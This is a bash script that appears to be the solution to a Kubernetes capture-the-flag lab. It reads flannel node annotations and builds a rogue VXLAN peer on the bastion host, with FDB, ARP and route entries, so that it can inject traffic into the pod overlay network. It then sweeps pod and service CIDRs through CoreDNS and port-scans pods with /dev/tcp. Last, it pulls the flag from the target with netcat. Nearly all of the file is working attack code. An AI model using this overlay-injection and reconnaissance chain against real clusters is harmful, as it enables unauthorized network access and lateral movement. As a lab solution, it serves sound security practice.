#!/bin/bash

set -e

echo "=== [0] Setup ==="
apt update -qq && apt install -y -qq nmap dnsutils tcpdump bridge-utils netcat-openbsd >/dev/null

echo ""
echo "=== [1] Map the network from node annotations (Hint 1) ==="
NODES_JSON=$(kubectl get nodes -o json)
echo "$NODES_JSON" | jq -r '.items[] | "\(.metadata.name)  underlay=\(.metadata.annotations["flannel.alpha.coreos.com/public-ip"])  podCIDR=\(.spec.podCIDR)  vtep=\(.metadata.annotations["flannel.alpha.coreos.com/backend-data"] | fromjson | .VtepMAC)"'

declare -A NODE_IP NODE_VTEP NODE_PODCIDR
while IFS=$'\t' read -r name underlay vtep podcidr; do
  NODE_IP[$name]=$underlay
  NODE_VTEP[$name]=$vtep
  NODE_PODCIDR[$name]=$podcidr
done < <(echo "$NODES_JSON" | jq -r '.items[] | [.metadata.name, .metadata.annotations["flannel.alpha.coreos.com/public-ip"], (.metadata.annotations["flannel.alpha.coreos.com/backend-data"] | fromjson | .VtepMAC), .spec.podCIDR] | @tsv')

echo ""
echo "=== [2] Build flannel overlay peer ==="
ip link del flannel.1 2>/dev/null || true
for c in 0 1 2; do ip route del 10.42.$c.0/24 2>/dev/null || true; done
ip route del 10.43.0.0/16 2>/dev/null || true

# Same VNI/dstport as flannel
ip link add flannel.1 type vxlan id 1 dev eth0 dstport 8472 nolearning
ip link set flannel.1 up
ip addr add 10.42.99.0/32 dev flannel.1   # cosmetic; not used as src

# Populate FDB and ARP from node annotations
for name in "${!NODE_IP[@]}"; do
  bridge fdb append "${NODE_VTEP[$name]}" dev flannel.1 dst "${NODE_IP[$name]}" self permanent
  gw=$(echo "${NODE_PODCIDR[$name]}" | sed 's|/.*||')
  ip neigh replace "$gw" lladdr "${NODE_VTEP[$name]}" dev flannel.1
done

# KEY TRICK: src 172.30.0.5 forces inner packets to be sourced from bastion's
# underlay IP, so pod replies route back as plain L3 traffic via the node's
# default gateway → docker bridge → us. No need for the receiving node to
# know our VTEP MAC.
BASTION_IP=$(ip -4 -o addr show eth0 | awk '{print $4}' | cut -d/ -f1)
for name in "${!NODE_PODCIDR[@]}"; do
  cidr="${NODE_PODCIDR[$name]}"
  gw=$(echo "$cidr" | sed 's|/.*||')
  ip route add "$cidr" via "$gw" dev flannel.1 onlink src "$BASTION_IP"
done

echo "Routes:"
ip route show | grep 10.42

echo ""
echo "=== [3] Find CoreDNS pod by sweeping pod CIDRs (Hint 2) ==="
COREDNS_IP=""
for name in "${!NODE_PODCIDR[@]}"; do
  cidr_base=$(echo "${NODE_PODCIDR[$name]}" | sed 's|\.0/.*||')
  for i in $(seq 2 20); do
    ip="$cidr_base.$i"
    ans=$(timeout 1 dig @"$ip" cluster.local SOA +short +time=1 +tries=1 2>/dev/null | head -1)
    if [[ -n "$ans" ]] && [[ "$ans" != *"error"* ]] && [[ "$ans" != *"timed out"* ]]; then
      echo "CoreDNS found: $ip ($ans)"
      COREDNS_IP="$ip"
      break 2
    fi
  done
done
[[ -z "$COREDNS_IP" ]] && { echo "ERROR: no CoreDNS pod found"; exit 1; }

echo ""
echo "=== [4] PTR-sweep service CIDR to find target service (Hint 3) ==="
TARGET_SVC=""
TARGET_VIP=""
for i in $(seq 1 254); do
  ans=$(dig @"$COREDNS_IP" -x 10.43.0.$i +short +time=1 +tries=1 2>/dev/null)
  if [[ -n "$ans" ]]; then
    echo "10.43.0.$i -> $ans"
    if [[ "$ans" != *"kubernetes.default"* ]] && [[ "$ans" != *"kube-dns"* ]]; then
      TARGET_SVC="${ans%.}"
      TARGET_VIP="10.43.0.$i"
    fi
  fi
done
[[ -z "$TARGET_SVC" ]] && { echo "ERROR: no target service found"; exit 1; }
echo "Target: $TARGET_SVC @ $TARGET_VIP"

echo ""
echo "=== [5] SRV query to learn the port ==="
SRV_LINE=$(dig @"$COREDNS_IP" SRV "$TARGET_SVC" +short)
echo "SRV: $SRV_LINE"
TARGET_PORT=$(echo "$SRV_LINE" | awk '{print $3}')
[[ -z "$TARGET_PORT" ]] && { echo "ERROR: no SRV port"; exit 1; }
echo "Port: $TARGET_PORT"

echo ""
echo "=== [6] Find target pod IP (Service VIP isn't reachable for our source) ==="
TARGET_POD=""
for name in "${!NODE_PODCIDR[@]}"; do
  cidr_base=$(echo "${NODE_PODCIDR[$name]}" | sed 's|\.0/.*||')
  for i in $(seq 2 30); do
    ip="$cidr_base.$i"
    if timeout 1 bash -c "echo > /dev/tcp/$ip/$TARGET_PORT" 2>/dev/null; then
      echo "Target pod open: $ip:$TARGET_PORT"
      TARGET_POD="$ip"
      break 2
    fi
  done
done
[[ -z "$TARGET_POD" ]] && { echo "ERROR: no pod listening on $TARGET_PORT"; exit 1; }

echo ""
echo "=== [7] Submit 'flag' command - server responds with the flag ==="
echo "==============================================="
RESPONSE_FILE=$(mktemp)
printf 'flag\n' | nc -w 3 "$TARGET_POD" "$TARGET_PORT" > "$RESPONSE_FILE" 2>/dev/null || true
cat "$RESPONSE_FILE"
echo "==============================================="
if ! grep -qE 'WIZ_CTF\{' "$RESPONSE_FILE"; then
  cat <<EOF

No flag in the response. This SHOULD work, so something is off.

Likely causes:
  - The CTF lab timed out; flag-server has been reaped.
  - Pod IP $TARGET_POD got recycled to a different workload
    (port $TARGET_PORT happens to be open, but it is not flag-server now).
  - Some flag servers only respond once per source IP - try a fresh lab session.

Re-run the request manually (output goes straight to your terminal,
which sidesteps any stdio-buffering weirdness):

  printf 'flag\n' | nc -w 3 $TARGET_POD $TARGET_PORT

If that is also silent, re-discover any pod listening on port $TARGET_PORT:

  for cidr in 10.42.0 10.42.1 10.42.2; do
    for i in \$(seq 2 30); do
      timeout 1 bash -c "echo > /dev/tcp/\$cidr.\$i/$TARGET_PORT" 2>/dev/null \\
        && echo "\$cidr.\$i"
    done
  done

EOF
fi
rm -f "$RESPONSE_FILE"